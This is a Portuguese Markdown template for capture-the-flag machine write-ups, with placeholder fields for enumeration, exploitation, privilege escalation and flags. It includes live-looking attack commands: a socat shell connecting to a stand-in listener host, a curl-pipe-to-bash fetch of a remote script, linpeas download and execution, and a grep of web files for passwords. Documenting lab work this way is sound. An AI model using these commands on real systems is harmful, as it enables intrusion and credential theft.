# 🏴️ NOME_DA_MAQUINA

> **Dificuldade:** :material-progress-clock: Easy | **SO:** Linux | **Release:** Active/Retired

---

## 📋 Informações Gerais

| Campo | Valor |
|:------|:------|
| **Nome** | Nome da Máquina |
| **IP** | 10.10.10.10 |
| **SO** | Linux |
| **Dificuldade** | Easy / Medium / Hard |
| **Data** | DD/MM/YYYY |
| **Release** | Active / Retired |

---

## 🔍 Enumeração Inicial

### Portas Abertas

| Porta | Serviço | Versão |
|:------|:--------|:-------|
| 22 | ssh | OpenSSH x.x |
| 80 | http | Apache x.x |

### Comandos

```bash
# Scan rápido
nmap -sV -p- -T4 10.10.10.10

# Scan completo com scripts
nmap -sVC -p- 10.10.10.10

# Enumeração web
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -t 20
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/ffuf/common.txt
```

### Descobertas Iniciais

- [ ] Descoberta 1
- [ ] Descoberta 2

---

## 🚀 Exploração

### Vetor de Entrada

| Campo | Valor |
|:------|:------|
| **Vetor** | Web |
| **Falha** | Descrição da vulnerabilidade |
| **Ferramentas** | curl, burp, etc |

### Processo

```
1. Primeira etapa...
2. Segunda etapa...
3. Terceira etapa...
```

### Código/Comandos

```bash
# Comando executado
curl http://10.10.10.10/endpoint
```

### Resultado

| Campo | Valor |
|:------|:------|
| **Usuário** | www-data |
| **Shell** | reverse shell com nc |

---

## 🐚 Shell Inicial

### Estabilização

```bash
# Método 1: python
python3 -c "import pty; pty.spawn('/bin/bash')"

# Método 2: socat
socat file:`tty`,raw,echo=0 tcp:LISTENER

# Método 3: upgrade com script
curl -s https://raw.githubusercontent.com/rupping/invoke-katbin/main/bin/katbin.sh | bash
```

---

## 📁 Enumeração Pós-Exploração

### Usuários do Sistema

| Usuário | Shell | Home |
|:--------|:------|:-----|
| root | /bin/bash | /root |
| user | /bin/bash | /home/user |

### Credenciais Encontradas

| Tipo | Valor |
|:-----|:------|
| Senha | password123 |
| Hash | $1$xxxxx |

### Arquivos Interessantes

```bash
# Busca por arquivos com permissões especiais
find / -perm -4000 2>/dev/null

# Busca por credenciais
grep -r "password" /var/www 2>/dev/null
```

---

## ⬆️ Escalação de Privilégios

### Vetores Identificados

- [ ] Cron jobs executando como root
- [ ] Binários SUID
- [ ] Permissões sudo mal configuradas

### Exploração

```bash
# Verificar permissões sudo
sudo -l

# Enumeração automática
wget https://raw.githubusercontent.com/peassng/linpeas/master/linpeas.sh
./linpeas.sh
```

### Resultado

| Campo | Valor |
|:------|:------|
| **Acesso** | root |
| **Método** | Exploração de cron job |
| **Data** | DD/MM/YYYY |

---

## 🚩 Flags

| :material-flag-outline: User | :material-flag: Root |
|:-----------------------------|:---------------------|
| `flag{user_flag_here}` | `flag{root_flag_here}` |

---

## 📸 Evidências

![Evidência 1](../img/nome-maquina/scan.png)

---

## 📖 Resumo Técnico

| Campo | Valor |
|:------|:------|
| **Causa Raiz** | Descrição da vulnerabilidade principal |
| **Cadeia de Ataque** | Enumeração → Shell inicial → Privesc |
| **Tempo Total** | ~45 minutos |

---

## 💡 Lições Aprendidas

- **O que funcionou:** técnica X funcionou bem
- **O que atrasou:** ponto que causou dificuldade
- **Pontos de Atenção:** lições importantes

---

## 🔗 Referências

- [Link 1](https://link.com)
- [Link 2](https://link.com)